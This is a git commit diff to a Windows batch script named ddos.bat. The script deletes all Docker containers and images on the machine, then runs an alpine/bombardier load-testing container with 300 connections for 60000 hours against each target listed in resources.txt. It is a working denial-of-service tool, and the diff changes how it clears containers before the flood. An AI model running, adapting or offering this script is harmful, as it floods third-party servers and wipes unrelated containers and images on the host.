4e01585058168752f21722157094f447d7dc1ebe
Dmytro <50082968+RGBsrs@users.noreply.github.com>
2022-02-27 11:53:33 +0200

    Update ddos.bat
    add container stop

--- ddos.bat
+++ ddos.bat
@@ -1,8 +1,9 @@
 @echo off
 set arg1=%1
 
-docker rm -f $(docker ps -a -q)
-docker rmi -f $(docker images -q)
+docker kill $(docker ps -q)
+docker rm $(docker ps -a -q)
+docker rmi $(docker images -q)
 
 for /f "tokens=*" %%s in (resources.txt) do (
 	if (%arg1% == '') docker run -d --rm alpine/bombardier -c 300 -d 60000h -l %%s
